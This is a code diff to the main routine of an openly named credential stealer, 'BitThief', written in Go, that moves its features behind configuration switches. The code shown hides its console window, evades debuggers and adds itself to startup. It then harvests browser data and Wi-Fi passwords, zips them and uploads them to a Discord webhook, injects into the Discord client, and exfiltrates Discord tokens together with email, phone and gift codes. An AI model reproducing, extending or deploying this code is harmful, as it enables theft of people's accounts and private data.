@@ -27,11 +27,10 @@ import (
 )
 
 const (
-	webhookURLencoded = ""
-	outputDir         = "Vault"
-	localAppData      = "LOCALAPPDATA"
-	username          = "BitThief"
-	avatar_url        = "https://pixabay.com/get/ga83e71eaed528e5a0702a216878e4595c8c18088c96da855a22f9527375afcbd9261367c9e5d45f112866d96af682d777216d78b96c3b9ba4fdcb47e991d9d93a4472770ca894004ec41457f18693fc6_640.jpg"
+	outputDir    = "Vault"
+	localAppData = "LOCALAPPDATA"
+	username     = "BitThief"
+	avatar_url   = "https://pixabay.com/get/ga83e71eaed528e5a0702a216878e4595c8c18088c96da855a22f9527375afcbd9261367c9e5d45f112866d96af682d777216d78b96c3b9ba4fdcb47e991d9d93a4472770ca894004ec41457f18693fc6_640.jpg"
 )
 
 type (
@@ -155,87 +154,105 @@ var (
 	showWindow             = user32.NewProc("ShowWindow")
 )
 
+var webhookURLencoded string
+
 const SW_HIDE = 0
 
 func main() {
+	config := NewConfig()
+	webhookURLencoded = config.Webhook
+	if webhookURLencoded == "" {
+		log.Fatal("Webhook URL not set")
+		os.Exit(1)
+	}
+
 	hideConsole()
 
-	ad := NewAntiDebug()
-	if ad.checks() {
-		os.Exit(0)
-	}
-
-	if err := AddStartup(); err != nil {
-		log.Fatalf("Startup error: %v", err)
-	}
-
-	browsers := make(map[string]string)
-	for key, value := range encodedBrowsers {
-		browsers[decodeBase64(key)] = decodeBase64(value)
-	}
-
-	os.MkdirAll(outputDir, 0755)
-	defer cleanup()
-
-	appData := os.Getenv(localAppData)
-	if appData == "" {
-		log.Fatal("LOCALAPPDATA environment variable not set")
-	}
-
-	data := collectBrowserData(appData, browsers)
-	writeDataFiles(data)
-	wifiPasswords := getWiFiPasswords()
-	writeFile(filepath.Join(outputDir, "wifi.txt"), wifiPasswords)
-
-	zipPath := outputDir + ".zip"
-	createZip(zipPath)
-
-	sendFileToDiscord(zipPath)
-	time.Sleep(2 * time.Second)
-
-	if err := InjectDiscord(getWebhookURL()); err != nil {
-		log.Fatalf("Injection error: %v", err)
-	}
-
-	sysInfo := getSystemInfo()
-	fileSizes := make(map[string]int64)
-	_ = filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return err
+	if config.AntiDebug {
+		ad := NewAntiDebug()
+		if ad.checks(*config) {
+			os.Exit(0)
 		}
-		if !info.IsDir() {
-			fileSizes[info.Name()] = info.Size()
-		}
-		return nil
-	})
-	browserEmbed := createBrowserEmbed(fileSizes, sysInfo)
-	sendEmbedToDiscord(browserEmbed)
-	time.Sleep(2 * time.Second)
+	}
 
-	ft := NewFetchTokens()
-	tokenInfoList := ft.Upload(true)
-	var tokenInfo *TokenInfo
-	if len(tokenInfoList) > 0 {
-		var tokenData map[string]interface{}
-		if err := json.Unmarshal([]byte(tokenInfoList[0]), &tokenData); err == nil {
-			tokenInfo = &TokenInfo{
-				Username:  tokenData["username"].(string),
-				Token:     tokenData["token"].(string),
-				Nitro:     tokenData["nitro"].(string),
-				MFA:       tokenData["mfa"].(bool),
-				Email:     tokenData["email"].(string),
-				Phone:     tokenData["phone"].(string),
-				Avatar:    tokenData["avatar"].(string),
-				HQGuilds:  tokenData["hq_guilds"].(string),
-				HQFriends: tokenData["hq_friends"].(string),
-				GiftCodes: tokenData["gift_codes"].(string),
-				Badges:    tokenData["badges"].(string),
+	if config.Startup {
+		if err := AddStartup(); err != nil {
+			log.Fatalf("Startup error: %v", err)
+		}
+	}
+
+	if config.BrowserStealer {
+		browsers := make(map[string]string)
+		for key, value := range encodedBrowsers {
+			browsers[decodeBase64(key)] = decodeBase64(value)
+		}
+
+		os.MkdirAll(outputDir, 0755)
+		defer cleanup()
+
+		appData := os.Getenv(localAppData)
+		if appData == "" {
+			log.Fatal("LOCALAPPDATA environment variable not set")
+		}
+
+		data := collectBrowserData(appData, browsers)
+		writeDataFiles(data)
+		wifiPasswords := getWiFiPasswords()
+		writeFile(filepath.Join(outputDir, "wifi.txt"), wifiPasswords)
+
+		zipPath := outputDir + ".zip"
+		createZip(zipPath)
+
+		sendFileToDiscord(zipPath)
+	}
+	if config.DiscordInject {
+		if err := InjectDiscord(getWebhookURL()); err != nil {
+			log.Fatalf("Injection error: %v", err)
+		}
+	}
+
+	if config.BrowserStealer {
+		sysInfo := getSystemInfo()
+		fileSizes := make(map[string]int64)
+		_ = filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return err
+			}
+			if !info.IsDir() {
+				fileSizes[info.Name()] = info.Size()
+			}
+			return nil
+		})
+		browserEmbed := createBrowserEmbed(fileSizes, sysInfo)
+		sendEmbedToDiscord(browserEmbed)
+	}
+
+	if config.tokenStealer {
+		ft := NewFetchTokens()
+		tokenInfoList := ft.Upload(true)
+		var tokenInfo *TokenInfo
+		if len(tokenInfoList) > 0 {
+			var tokenData map[string]interface{}
+			if err := json.Unmarshal([]byte(tokenInfoList[0]), &tokenData); err == nil {
+				tokenInfo = &TokenInfo{
+					Username:  tokenData["username"].(string),
+					Token:     tokenData["token"].(string),
+					Nitro:     tokenData["nitro"].(string),
+					MFA:       tokenData["mfa"].(bool),
+					Email:     tokenData["email"].(string),
+					Phone:     tokenData["phone"].(string),
+					Avatar:    tokenData["avatar"].(string),
+					HQGuilds:  tokenData["hq_guilds"].(string),
+					HQFriends: tokenData["hq_friends"].(string),
+					GiftCodes: tokenData["gift_codes"].(string),
+					Badges:    tokenData["badges"].(string),
+				}
 			}
 		}
-	}
-	if tokenInfo != nil {
-		tokenEmbed := createTokenEmbed(tokenInfo)
-		sendEmbedToDiscord(tokenEmbed)
+		if tokenInfo != nil {
+			tokenEmbed := createTokenEmbed(tokenInfo)
+			sendEmbedToDiscord(tokenEmbed)
+		}
 	}
 
 	createCleanupBatch()
